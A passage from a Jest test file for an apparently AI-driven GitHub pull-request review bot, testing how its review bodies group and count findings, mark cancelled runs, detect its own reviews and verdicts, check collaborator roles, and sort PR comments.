    // One missed finding reads as singular, and several pre-existing ones as plural. The verdict line counts the late
    // warning in its thread with the listed ones.
    const counting = makeOctokit();
    const late = [nonBlocking('warning', 'On old code', 3, { origin: 'reviewed', tags: ['follow-up'] }), nonBlocking('warning', 'Old code off the diff', 40, { origin: 'reviewed', tags: ['follow-up'] })];
    await postReview(counting.octokit, 'owner', 'repo', 1, 'sha', { ...buildResult([
      ...late,
      nonBlocking('warning', 'Old race', 90, { origin: 'reviewed', tags: ['pre-existing'] }),
      nonBlocking('warning', 'Old lock order', 91, { origin: 'reviewed', tags: ['pre-existing'] }),
    ]), outcome: 'READY' }, diff);
    const counted = counting.createReview.mock.calls[0][0].body as string;
    expect(counted).toMatch(/^\u2705 \*\*Approved\.\*\* 4 warnings, none of which block\./u);
    expect(counted).toContain('### Missed by an earlier review · 1 warning\n\nIt sits on lines an earlier round already reviewed, so it doesn\'t block this PR.');
    expect(counted).toContain('### Pre-existing · 2 warnings\n\nThese sit on code this PR did not change, so none of them block. A blocker among them is listed as a warning.');
    // With every late warning in a thread, the body has no section for them.
    const threaded = makeOctokit();
    const verdictReport = { verdict: 'READY' as const, blockers: [], summary: 'Nothing blocks.', whatThisDoes: 'Adds a retry.', whatToTest: { steps: ['Load the page twice.'] } };
    await postReview(threaded.octokit, 'owner', 'repo', 1, 'sha', { ...buildResult([late[0]]), outcome: 'READY', verdictReport }, quoting);
    expect(threaded.createReview.mock.calls[0][0].comments).toHaveLength(1);
    expect(threaded.createReview.mock.calls[0][0].body).toContain(`<summary>What to test</summary>\n\n${guideNote}\n\n1. Load the page twice.`);
    expect(threaded.createReview.mock.calls[0][0].body).toMatch(/^\u2705 \*\*Approved\.\*\* 1 warning, which doesn't block\.(?![\s\S]*Missed by an earlier review)/u);
    // When GitHub refuses the line comments, the late warning is listed with them, and the record says it has no thread.
    const refusing = makeOctokit({ 'src/a.ts': 'load();\nretry();\nend();\n' });
    refusing.createReview.mockRejectedValueOnce(new Error('pull_request_review_thread.line must be part of the diff'));
    const lateEntries = [makeFindingFingerprintEntry({ title: late[0].title, severity: 'warning', lineStart: late[0].line })];
    await postReview(refusing.octokit, 'owner', 'repo', 1, 'sha', { ...buildResult([late[0]]), outcome: 'READY' }, diff, makeContext({ findings: { count: 1, severityCounts: {}, entries: lateEntries } }), 1000);
    const [refused, bare] = refusing.createReview.mock.calls.map(([args]) => args);
    expect(refused.comments).toHaveLength(1);
    expect(bare.comments).toEqual([]);
    expect(bare.body).toContain('**Inline comments could not be posted:**\n- \u26A0\uFE0F **Warning, not blocking** **On old code**');
    expect(JSON.parse(extractReviewRecords(bare.body).records[0]).findings.entries).toEqual([expect.objectContaining({ posted: 'body', citedLine: { hash: expect.any(String), count: 1 } })]);
    expect(review.body).not.toMatch(/not listed|smaller fix|Previously missed|Found this round/);
    // From the second round, the findings new to this round are "Found this round". A restatement of a finding an earlier
    // review body listed is "Still open" from that round, even on a changed line, and one of an open thread is not posted.
    await postReview(octokit, 'owner', 'repo', 1, 'sha', buildResult([
      nonBlocking('warning', 'New off the diff', 40, { origin: 'new', tags: ['follow-up'] }),
      nonBlocking('note', 'Note listed in round 1', 11, { origin: 'earlier', raisedIn: 1 }),
      nonBlocking('warning', 'Listed in round 1', 11, { origin: 'earlier', raisedIn: 1, tags: ['follow-up'] }),
      nonBlocking('warning', 'Also listed in round 1', 3, { origin: 'earlier', raisedIn: 1, tags: ['follow-up'] }),
      nonBlocking('warning', 'Listed in round 2', 3, { origin: 'earlier', raisedIn: 2, tags: ['follow-up'] }),
      nonBlocking('warning', 'Old race listed in round 1', 90, { origin: 'earlier', raisedIn: 1, tags: ['follow-up', 'pre-existing'] }),
      nonBlocking('warning', 'Restates an open thread', 11, { origin: 'new', threadId: 'T1', tags: ['follow-up'] }),
      nonBlocking('warning', 'Another field the check misses', 11, { origin: 'new', threadId: 'T1', variantOf: 'src/a.ts:11:11:x', tags: ['follow-up'] }),
    ]), diff, makeContext({ meta: { ...makeContext().meta, round: 3 } }));
    const third = createReview.mock.calls[1][0];
    expect(third.comments ?? []).toEqual([]);
    expect(third.body).toContain('### Found this round · 1 warning\n\n<details>\n<summary>\u26A0\uFE0F <b>New off the diff</b>');
    expect(third.body).toContain('### Still open from round 1 · 2 warnings\n\nRound 1 listed these, and this round finds them again.\n\n<details>\n<summary>\u26A0\uFE0F <b>Listed in round 1</b>');
    expect(third.body).toContain('### Still open from round 2 · 1 warning\n\nRound 2 listed it, and this round finds it again.');
    expect(third.body).toContain('<summary><b>1 note</b> · not blocking</summary>\n\n<details>\n<summary>\u2728 <b>Note listed in round 1</b>');
    expect(third.body.indexOf('Still open from round 1')).toBeLessThan(third.body.indexOf('Still open from round 2'));
    // A pre-existing finding stays under "Pre-existing", where its intro says it does not block.
    expect(third.body).toContain('### Pre-existing · 1 warning\n\nIt sits on code this PR did not change');
    expect(third.body).not.toMatch(/Restates an open thread|Another field the check misses|Missed by an earlier review/);
    // Warnings an earlier round listed that this round did not raise again get one short list, and an approval counts them.
    // The list shows the line the warning is on now, and only the file for one whose place is not a single one.
    const carriedEntry = (title: string, lineStart: number, raisedIn: number, currentLine?: number) => ({ ...makeFindingFingerprintEntry({ title, lineStart }), raisedIn, currentLine });
    const carriedBody = async (carried: ReviewResult['carried']): Promise<string> => {
      const carrying = makeOctokit();
      const result: ReviewResult = { ...buildResult([nonBlocking('warning', 'New off the diff', 40, { origin: 'new', tags: ['follow-up'] })]), outcome: 'READY', carried };
      await postReview(carrying.octokit, 'owner', 'repo', 1, 'sha', result, diff, makeContext({ meta: { ...makeContext().meta, round: 3 } }));
      return carrying.createReview.mock.calls[0][0].body;
    };
    const several = await carriedBody([carriedEntry('Retry never ends', 10, 1, 12), carriedEntry('Queue has no `limit`', 7, 2)]);
    expect(several).toMatch(/^\u2705 \*\*Approved\.\*\* 3 warnings, none of which block\./u);
    expect(several).toContain('### Earlier warnings, code unchanged · 2 warnings\n\nAn earlier round listed these, and this round did not raise them again. The line each points at still reads the same, so they stay listed. None of them blocks.\n\n- `src/a.ts:12`: Retry never ends (round 1)\n- `src/a.ts`: Queue has no `limit` (round 2)\n\n');
    expect(several.indexOf('### Found this round')).toBeLessThan(several.indexOf('### Earlier warnings, code unchanged'));
    expect(await carriedBody([carriedEntry('Retry never ends', 10, 1, 10)])).toContain('### Earlier warnings, code unchanged · 1 warning\n\nAn earlier round listed it, and this round did not raise it again. The line it points at still reads the same, so it stays listed. It doesn\'t block.\n\n- `src/a.ts:10`: Retry never ends (round 1)');
    expect(await carriedBody(undefined)).not.toContain('Earlier warnings');
    // The record keeps a hash of the line a warning listed only in the body points at, with the lines around it, and how
    // many places of its file read the same. A line the file does not have gives none.
    const recording = makeOctokit({ 'src/a.ts': 'load();\n  retry();\nend();\n\nload();\nretry();\nend();\n' });
    const listed = [
      nonBlocking('warning', 'Listed before', 2, { origin: 'earlier', raisedIn: 1, tags: ['follow-up'] }), nonBlocking('warning', 'Past the end', 9, { origin: 'earlier', raisedIn: 1, tags: ['follow-up'] }),
      nonBlocking('warning', 'On new code', 11, { origin: 'new', tags: ['follow-up'] }), nonBlocking('note', 'Note', 1, { origin: 'new' }),
      nonBlocking('warning', 'On old code', 3, { origin: 'reviewed', tags: ['follow-up'] }),
    ];
    const entries = listed.map(f => makeFindingFingerprintEntry({ title: f.title, severity: f.severity, lineStart: f.line }));
    await postReview(recording.octokit, 'owner', 'repo', 1, 'sha', buildResult(listed), diff, makeContext({ findings: { count: listed.length, severityCounts: {}, entries } }), 1000);
    const record = JSON.parse(extractReviewRecords(recording.createReview.mock.calls[0][0].body).records[0]);
    expect(record.findings.entries.map((e: FindingFingerprintEntry) => [e.posted, e.citedLine])).toEqual([
      ['body', { hash: expect.stringMatching(/^[0-9a-f]{12}$/), count: 2 }], ['body', undefined], ['thread', undefined], ['body', undefined], ['thread', undefined],
    ]);
    // A security finding on unchanged code still blocks, and its header says where it sits.
    expect(formatFindingComment(nonBlocking('blocker', 'Old SQL injection', 90, { tags: ['security', 'pre-existing'] }), TEST_LINKS).split('\n')[0]).toBe('\u{1F6AB} **Blocker** · Pre-existing');
  });
});

describe('markOwnProgressCommentCancelled', () => {
  type Octokit = ReturnType<typeof import('@actions/github').getOctokit>;
  const STATE = 'STATE_manki_progress_comment';
  const running = withMarkers('**Review in progress**', BOT_MARKER);

  function makeOctokit(read: { body: string } | Error) {
    const getComment = read instanceof Error ? jest.fn().mockRejectedValue(read) : jest.fn().mockResolvedValue({ data: { id: 10, ...read } });
    const updateComment = jest.fn().mockResolvedValue({});
    return { octokit: { rest: { issues: { getComment, updateComment } } } as unknown as Octokit, getComment, updateComment };
  }

  beforeEach(() => { process.env[STATE] = '10'; });
  afterEach(() => { delete process.env[STATE]; });

  it('marks the progress comment the run saved as cancelled, keeping its text', async () => {
    const { octokit, getComment, updateComment } = makeOctokit({ body: running });

    expect(await markOwnProgressCommentCancelled(octokit, 'owner', 'repo')).toBe(true);

    expect(getComment).toHaveBeenCalledWith({ owner: 'owner', repo: 'repo', comment_id: 10 });
    expect(updateComment).toHaveBeenCalledWith(expect.objectContaining({ comment_id: 10 }));
    const body = updateComment.mock.calls[0][0].body as string;
    expect(body.startsWith('**Review cancelled:** the run stopped before the review finished.')).toBe(true);
    expect(body).toContain(running);
    expect(body.endsWith(`\n\n${CANCELLED_MARKER}`)).toBe(true);
  });

  it('keeps the settings block last, saying the review was cancelled and offering no Cancel box', async () => {
    const view: SettingsView = { head: 'abc1234', status: 'review running', boxes: new Set(['pause', 'again', 'cancel']), ticked: new Set(['pause']) };
    const { octokit, updateComment } = makeOctokit({ body: withSettingsBlock(running, view) });

    expect(await markOwnProgressCommentCancelled(octokit, 'owner', 'repo')).toBe(true);
    const body = updateComment.mock.calls[0][0].body as string;
    expect(body).toContain(`${running}\n\n</details>`);
    expect(parseSettingsBlock(body)).toEqual({ head: 'abc1234', status: 'review cancelled', boxes: new Set(['pause', 'again']), ticked: new Set(['pause']) });
  });

  it.each([
    ['the run posted no progress comment', undefined, { body: running }],
    ['the comment is complete', '10', { body: withMarkers('Done', BOT_MARKER, REVIEW_COMPLETE_MARKER) }],
    ['the comment is already cancelled', '10', { body: withMarkers('Failed', BOT_MARKER, CANCELLED_MARKER) }],
    ['the run deleted its comment', '10', Object.assign(new Error('Not Found'), { status: 404 })],
  ])('leaves everything as it is when %s', async (_label, saved, read) => {
    if (saved === undefined) delete process.env[STATE];
    const warning = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const { octokit, updateComment } = makeOctokit(read);

    expect(await markOwnProgressCommentCancelled(octokit, 'owner', 'repo')).toBe(false);
    expect(updateComment).not.toHaveBeenCalled();
    expect(warning).not.toHaveBeenCalled();
    warning.mockRestore();
  });

  it('returns false and warns when the comment cannot be read', async () => {
    const warning = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const { octokit } = makeOctokit(new Error('API error'));

    expect(await markOwnProgressCommentCancelled(octokit, 'owner', 'repo')).toBe(false);
    expect(warning).toHaveBeenCalledWith('Post-cleanup failed: API error');
    warning.mockRestore();
  });
});

describe('isApprovedOnCommit', () => {
  type Octokit = ReturnType<typeof import('@actions/github').getOctokit>;

  function makeMockOctokit(reviews: Array<{ body?: string | null; state: string; commit_id?: string; user?: { login?: string; type: string } }>) {
    return {
      paginate: jest.fn().mockResolvedValue(reviews),
      rest: {
        pulls: {
          listReviews: {},
        },
      },
    } as unknown as Octokit;
  }

  it('returns true when the latest bot review is APPROVED on the given commit', async () => {
    const octokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nReview`, state: 'APPROVED', commit_id: 'sha-123', user: { login: BOT_LOGIN, type: 'Bot' } },
    ]);

    expect(await isApprovedOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(true);
  });

  it('returns false when the approval is on a different commit', async () => {
    const octokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nReview`, state: 'APPROVED', commit_id: 'sha-old', user: { login: BOT_LOGIN, type: 'Bot' } },
    ]);

    expect(await isApprovedOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-new')).toBe(false);
  });

  it('returns false when the latest bot review is DISMISSED', async () => {
    const octokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nReview`, state: 'DISMISSED', commit_id: 'sha-123', user: { login: BOT_LOGIN, type: 'Bot' } },
    ]);

    expect(await isApprovedOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });

  it('returns false when there are no bot reviews', async () => {
    const octokit = makeMockOctokit([]);

    expect(await isApprovedOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });

  it('returns false when the API call fails', async () => {
    const octokit = {
      paginate: jest.fn().mockRejectedValue(new Error('API error')),
      rest: { pulls: { listReviews: {} } },
    } as unknown as Octokit;

    expect(await isApprovedOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });

  it('picks the latest non-dismissed review when multiple exist', async () => {
    const octokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nOld`, state: 'CHANGES_REQUESTED', commit_id: 'sha-old', user: { login: BOT_LOGIN, type: 'Bot' } },
      { body: `${BOT_MARKER}\nNew`, state: 'APPROVED', commit_id: 'sha-123', user: { login: BOT_LOGIN, type: 'Bot' } },
    ]);

    expect(await isApprovedOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(true);
  });

  it('returns false when latest non-dismissed review is CHANGES_REQUESTED', async () => {
    const octokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nOld`, state: 'APPROVED', commit_id: 'sha-123', user: { login: BOT_LOGIN, type: 'Bot' } },
      { body: `${BOT_MARKER}\nNew`, state: 'CHANGES_REQUESTED', commit_id: 'sha-123', user: { login: BOT_LOGIN, type: 'Bot' } },
    ]);

    expect(await isApprovedOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });

  it('ignores reviews from other bots without the bot marker', async () => {
    const octokit = makeMockOctokit([
      { body: 'Some other bot review', state: 'APPROVED', commit_id: 'sha-123', user: { type: 'Bot' } },
    ]);

    expect(await isApprovedOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });
});

describe('hasBotReviewOnCommit', () => {
  type Octokit = ReturnType<typeof import('@actions/github').getOctokit>;

  function makeMockOctokit(reviews: Array<{ body?: string | null; state: string; commit_id?: string; user?: { login?: string; type: string } }>) {
    return {
      paginate: jest.fn().mockResolvedValue(reviews),
      rest: {
        pulls: {
          listReviews: {},
        },
      },
    } as unknown as Octokit;
  }

  it.each([
    ['APPROVED'],
    ['COMMENTED'],
    ['CHANGES_REQUESTED'],
  ])('returns true when a non-DISMISSED bot review (%s) exists on the head SHA', async (state) => {
    const octokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nReview`, state, commit_id: 'sha-123', user: { login: BOT_LOGIN, type: 'Bot' } },
    ]);

    expect(await hasBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(true);
  });

  it('returns false when the only bot review on the SHA is DISMISSED', async () => {
    const octokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nReview`, state: 'DISMISSED', commit_id: 'sha-123', user: { login: BOT_LOGIN, type: 'Bot' } },
    ]);

    expect(await hasBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });

  it('returns false when the only bot review is on a different commit', async () => {
    const octokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nReview`, state: 'COMMENTED', commit_id: 'sha-old', user: { login: BOT_LOGIN, type: 'Bot' } },
    ]);

    expect(await hasBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-new')).toBe(false);
  });

  it('returns false when there are no bot reviews', async () => {
    const octokit = makeMockOctokit([]);

    expect(await hasBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });

  it('returns false on API error (fail-open)', async () => {
    const octokit = {
      paginate: jest.fn().mockRejectedValue(new Error('API error')),
      rest: { pulls: { listReviews: {} } },
    } as unknown as Octokit;

    expect(await hasBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });

  it('ignores non-bot reviewers', async () => {
    const octokit = makeMockOctokit([
      { state: 'APPROVED', commit_id: 'sha-123', user: { login: 'human', type: 'User' } },
    ]);

    expect(await hasBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });

  it('counts a review only when its author is the bot identity', async () => {
    const octokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nReview`, state: 'COMMENTED', commit_id: 'sha-123', user: { login: 'manki-review[bot]', type: 'Bot' } },
    ]);

    expect(await hasBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(true);
    expect(await hasBotReviewOnCommit(octokit, CUSTOM_APP_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);

    const patOctokit = makeMockOctokit([
      { body: `${BOT_MARKER}\nReview`, state: 'COMMENTED', commit_id: 'sha-123', user: { login: 'review-user', type: 'User' } },
    ]);
    expect(await hasBotReviewOnCommit(patOctokit, PAT_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(true);
    expect(await hasBotReviewOnCommit(patOctokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);
  });

  it('returns true when a prior bot review is on the SHA and a later DISMISSED one is too', async () => {
    const octokit = makeMockOctokit([
      { state: 'COMMENTED', commit_id: 'sha-123', body: `${BOT_MARKER}\nreview body`, user: { login: BOT_LOGIN, type: 'Bot' } },
      { state: 'DISMISSED', commit_id: 'sha-123', body: `${BOT_MARKER}\nreview body`, user: { login: BOT_LOGIN, type: 'Bot' } },
    ]);

    expect(await hasBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(true);
  });

  it('does not count an incomplete review, so a later run still reviews the commit', async () => {
    const incomplete = { state: 'COMMENTED', commit_id: 'sha-123', body: `⏸️ **Review incomplete:** Claude subscription limit reached.\n\n${BOT_MARKER}`, user: { login: BOT_LOGIN, type: 'Bot' } };
    expect(await hasBotReviewOnCommit(makeMockOctokit([incomplete]), TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(false);

    // A blocking review that quotes the incomplete line elsewhere in its body still counts.
    const quoting = { ...incomplete, state: 'CHANGES_REQUESTED', body: `🔴 **Changes requested:** 1 blocker.\n\n⏸️ **Review incomplete:** quoted\n\n${BOT_MARKER}` };
    expect(await hasBotReviewOnCommit(makeMockOctokit([quoting, incomplete]), TEST_BOT, 'owner', 'repo', 1, 'sha-123')).toBe(true);
  });

  it('returns true when the matching review is the 501st (beyond the 500-cap), not among the first 500', async () => {
    const old = Array.from({ length: 500 }, (_, i) => ({
      state: 'COMMENTED',
      commit_id: `sha-old-${i}`,
      body: `${BOT_MARKER}\nreview body`,
      user: { login: BOT_LOGIN, type: 'Bot' },
    }));
    const newest = { state: 'COMMENTED', commit_id: 'sha-new', body: `${BOT_MARKER}\nreview body`, user: { login: BOT_LOGIN, type: 'Bot' } };
    const octokit = makeMockOctokit([...old, newest]);

    expect(await hasBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-new')).toBe(true);
  });
});

describe('findBotReviewOnCommit', () => {
  type Octokit = ReturnType<typeof import('@actions/github').getOctokit>;

  function makeMockOctokit(reviews: Array<{ id?: number; body?: string | null; state: string; commit_id?: string; user?: { login?: string; type: string } }>) {
    return {
      paginate: jest.fn().mockResolvedValue(reviews),
      rest: {
        pulls: {
          listReviews: {},
        },
      },
    } as unknown as Octokit;
  }

  it('returns the last review for the target commit when reviews for multiple commits are interleaved', async () => {
    const reviewA1 = { id: 1, state: 'COMMENTED', commit_id: 'sha-a', body: `${BOT_MARKER}\nreview body`, user: { login: BOT_LOGIN, type: 'Bot' } };
    const reviewB = { id: 2, state: 'COMMENTED', commit_id: 'sha-b', body: `${BOT_MARKER}\nreview body`, user: { login: BOT_LOGIN, type: 'Bot' } };
    const reviewA2 = { id: 3, state: 'CHANGES_REQUESTED', commit_id: 'sha-a', body: `${BOT_MARKER}\nreview body`, user: { login: BOT_LOGIN, type: 'Bot' } };
    const octokit = makeMockOctokit([reviewA1, reviewB, reviewA2]);

    const result = await findBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-a');
    expect(result?.id).toBe(3);
  });

  it('returns undefined when only reviews for other commits exist', async () => {
    const reviewB = { id: 2, state: 'APPROVED', commit_id: 'sha-b', user: { login: BOT_LOGIN, type: 'Bot' } };
    const octokit = makeMockOctokit([reviewB]);

    expect(await findBotReviewOnCommit(octokit, TEST_BOT, 'owner', 'repo', 1, 'sha-a')).toBeUndefined();
  });
});

describe('fetchStandingVerdict', () => {
  type Octokit = ReturnType<typeof import('@actions/github').getOctokit>;
  const bot = { login: BOT_LOGIN, type: 'Bot' };

  function makeMockOctokit(reviews: Array<{ id: number; state: string; commit_id: string }>, timeline: unknown[] | Error = []) {
    const listReviews = {};
    const listEventsForTimeline = {};
    return {
      paginate: jest.fn().mockImplementation((endpoint: unknown) => {
        if (endpoint === listReviews) return Promise.resolve(reviews.map(r => ({ ...r, body: `${BOT_MARKER}\nreview`, user: bot })));
        return timeline instanceof Error ? Promise.reject(timeline) : Promise.resolve(timeline);
      }),
      rest: { pulls: { listReviews }, issues: { listEventsForTimeline } },
    } as unknown as Octokit;
  }

  function dismissal(reviewId: number, state: string, dismissalCommitId?: string) {
    return { event: 'review_dismissed', dismissed_review: { review_id: reviewId, state, dismissal_message: null, dismissal_commit_id: dismissalCommitId } };
  }

  it('reads the state of the latest bot review and the commit it reviewed', async () => {
    const approved = makeMockOctokit([
      { id: 1, state: 'CHANGES_REQUESTED', commit_id: 'sha-a' },
      { id: 2, state: 'APPROVED', commit_id: 'sha-b' },
    ]);
    expect(await fetchStandingVerdict(approved, TEST_BOT, 'owner', 'repo', 1)).toEqual({ verdict: 'APPROVE', commitSha: 'sha-b' });

    const changesRequested = makeMockOctokit([{ id: 1, state: 'CHANGES_REQUESTED', commit_id: 'sha-a' }]);
    expect(await fetchStandingVerdict(changesRequested, TEST_BOT, 'owner', 'repo', 1)).toEqual({ verdict: 'REQUEST_CHANGES', commitSha: 'sha-a' });

    const commented = makeMockOctokit([
      { id: 1, state: 'APPROVED', commit_id: 'sha-a' },
      { id: 2, state: 'COMMENTED', commit_id: 'sha-b' },
    ]);
    expect(await fetchStandingVerdict(commented, TEST_BOT, 'owner', 'repo', 1)).toBeUndefined();
    expect(await fetchStandingVerdict(makeMockOctokit([]), TEST_BOT, 'owner', 'repo', 1)).toBeUndefined();
  });

  it('counts an approval dismissed by a push as APPROVE', async () => {
    const octokit = makeMockOctokit(
      [{ id: 7, state: 'DISMISSED', commit_id: 'sha-a' }],
      [dismissal(6, 'changes_requested'), dismissal(7, 'approved', 'sha-pushed')],
    );
    expect(await fetchStandingVerdict(octokit, TEST_BOT, 'owner', 'repo', 1)).toEqual({ verdict: 'APPROVE', commitSha: 'sha-a' });
  });

  it('returns undefined for a review dismissed by hand or when the timeline cannot be read', async () => {
    const reviews = [{ id: 7, state: 'DISMISSED', commit_id: 'sha-a' }];
    expect(await fetchStandingVerdict(makeMockOctokit(reviews, [dismissal(7, 'approved')]), TEST_BOT, 'owner', 'repo', 1)).toBeUndefined();
    expect(await fetchStandingVerdict(makeMockOctokit(reviews, [dismissal(7, 'changes_requested')]), TEST_BOT, 'owner', 'repo', 1)).toBeUndefined();
    expect(await fetchStandingVerdict(makeMockOctokit(reviews, new Error('API error')), TEST_BOT, 'owner', 'repo', 1)).toBeUndefined();
  });
});

describe('authorClearRole', () => {
  /** A client whose permission lookup answers with `data`, or fails when `data` is an error. */
  const clientFor = (data: Record<string, unknown> | Error) => {
    const lookup = jest.fn(async () => {
      if (data instanceof Error) throw data;
      return { data };
    });
    return { octokit: { rest: { repos: { getCollaboratorPermissionLevel: lookup } } } as unknown as Parameters<typeof authorClearRole>[0], lookup };
  };
  // The legacy `permission` GitHub sends beside each `role_name`. It reports `maintain` as `write`.
  const answers: Record<string, Record<string, unknown> | Error> = {
    admin: { permission: 'admin', role_name: 'admin' },
    maintain: { permission: 'write', role_name: 'maintain' },
    write: { permission: 'write', role_name: 'write' },
    triage: { permission: 'read', role_name: 'triage' },
    read: { permission: 'read', role_name: 'read' },
    'a custom role above write': { permission: 'write', role_name: 'release-manager' },
    'a custom role named like one': { permission: 'admin', role_name: 'Admin' },
    'no role in the answer': { permission: 'admin' },
    'a role that is no string': { permission: 'admin', role_name: null },
    'a failed lookup': new Error('Server Error'),
  };

  it.each([
    ['admin', { admin: 'admin' }],
    ['maintain', { admin: 'admin', maintain: 'maintain' }],
    ['write', { admin: 'admin', maintain: 'maintain', write: 'write' }],
    [undefined, {}],
  ] as const)('gives the role of a login only when GitHub confirms one at or above `%s`', async (needed, allowed: Record<string, string>) => {
    const got: Record<string, string | undefined> = {};
    for (const [who, data] of Object.entries(answers)) got[who] = await authorClearRole(clientFor(data).octokit, 'o', 'r', 'alice', needed);

    expect(got).toEqual(Object.fromEntries(Object.keys(answers).map(who => [who, allowed[who]])));
  });

  it('asks once per login and client, and leaves write access to the legacy permission', async () => {
    const warningSpy = jest.spyOn(core, 'warning').mockImplementation(() => {});
    const maintainer = clientFor(answers.maintain);
    // No level set means the base branch config could not be read, so the lookup is not even made.
    expect(await authorClearRole(maintainer.octokit, 'o', 'r', 'alice', undefined)).toBeUndefined();
    expect(maintainer.lookup).not.toHaveBeenCalled();
    expect(await authorClearRole(maintainer.octokit, 'o', 'r', 'alice', 'admin')).toBeUndefined();
    expect(await authorClearRole(maintainer.octokit, 'o', 'r', 'Alice', 'maintain')).toBe('maintain');
    expect(await hasWriteAccess(maintainer.octokit, 'o', 'r', 'alice')).toBe(true);
    expect(maintainer.lookup).toHaveBeenCalledTimes(1);
    expect(maintainer.lookup).toHaveBeenCalledWith({ owner: 'o', repo: 'r', username: 'alice' });

    const access = async (who: string) => hasWriteAccess(clientFor(answers[who]).octokit, 'o', 'r', 'alice');
    expect(await Promise.all(['admin', 'write', 'triage', 'read', 'a custom role above write', 'a failed lookup'].map(access))).toEqual([true, true, false, false, true, false]);
    expect(warningSpy).toHaveBeenCalledWith('Could not read the repo permission of alice, treating it as none: Error: Server Error');
    warningSpy.mockRestore();
  });
});

describe('isBotLogin', () => {
  it('matches the REST and GraphQL forms of each bot login', () => {
    for (const login of ['manki-review[bot]', 'manki-review']) {
      expect(isBotLogin(TEST_BOT, login)).toBe(true);
    }
    expect(isBotLogin(CUSTOM_APP_BOT, 'acme-reviewer')).toBe(true);
    expect(isBotLogin(CUSTOM_APP_BOT, 'manki-review[bot]')).toBe(false);
    for (const login of ['someone', 'github-actions[bot]', 'github-actions', 'manki-review[bot][bot]', '', null, undefined]) {
      expect(isBotLogin(TEST_BOT, login)).toBe(false);
    }
  });
});

describe('fetchPRComments', () => {
  type Octokit = ReturnType<typeof import('@actions/github').getOctokit>;

  function makeMockOctokit(comments: Array<{ id: number; body: string; updated_at: string }>) {
    const octokit = {
      paginate: jest.fn(paginateSinglePage),
      rest: {
        issues: {
          listComments: jest.fn().mockResolvedValue({ data: comments }),
        },
      },
    } as unknown as Octokit;
    return octokit;
  }

  it('returns an empty array when there are no comments', async () => {
    const octokit = makeMockOctokit([]);

    const result = await fetchPRComments(octokit, 'owner', 'repo', 1);

    expect(result).toEqual([]);
  });

  it('returns a single-element array unchanged', async () => {
    const comment = { id: 1, body: 'hello', updated_at: '2026-05-22T12:00:00.000Z' };
    const octokit = makeMockOctokit([comment]);

    const result = await fetchPRComments(octokit, 'owner', 'repo', 1);

    expect(result).toHaveLength(1);
    expect(result[0].id).toBe(1);
  });

  it('sorts multiple comments by updated_at descending (newest first)', async () => {
    const comments = [
      { id: 1, body: 'oldest', updated_at: '2026-05-22T10:00:00.000Z' },
      { id: 3, body: 'newest', updated_at: '2026-05-22T12:00:00.000Z' },
      { id: 2, body: 'middle', updated_at: '2026-05-22T11:00:00.000Z' },
    ];
    const octokit = makeMockOctokit(comments);

    const result = await fetchPRComments(octokit, 'owner', 'repo', 1);

    expect(result.map(c => c.id)).toEqual([3, 2, 1]);
  });

  it('orders correctly when timestamps differ only in milliseconds', async () => {
    const comments = [
      { id: 1, body: 'earlier', updated_at: '2026-05-22T12:00:00.000Z' },
      { id: 2, body: 'later',   updated_at: '2026-05-22T12:00:00.001Z' },
    ];
    const octokit = makeMockOctokit(comments);

    const result = await fetchPRComments(octokit, 'owner', 'repo', 1);

    expect(result.map(c => c.id)).toEqual([2, 1]);
  });

  it('propagates API rejection to the caller', async () => {
    const octokit = {
      paginate: jest.fn(paginateSinglePage),
      rest: {
        issues: {
          listComments: jest.fn().mockRejectedValue(new Error('API error')),
        },
      },
    } as unknown as Octokit;

    await expect(fetchPRComments(octokit, 'owner', 'repo', 1)).rejects.toThrow('API error');
  });

  it('passes owner, repo, and prNumber to listComments', async () => {
    const octokit = makeMockOctokit([]);

    await fetchPRComments(octokit, 'my-owner', 'my-repo', 42);

    expect(octokit.paginate).toHaveBeenCalledWith(octokit.rest.issues.listComments, expect.objectContaining({
      owner: 'my-owner',
      repo: 'my-repo',
      issue_number: 42,
      per_page: 100,
    }));
  });

  it('returns comments from every page, newest first', async () => {
    const comments = Array.from({ length: 150 }, (_, i) => ({
      id: i + 1, body: `comment ${i + 1}`, updated_at: new Date(Date.UTC(2026, 4, 22, 0, i)).toISOString(),
    }));
    const octokit = makeMockOctokit(comments.slice(0, 100));
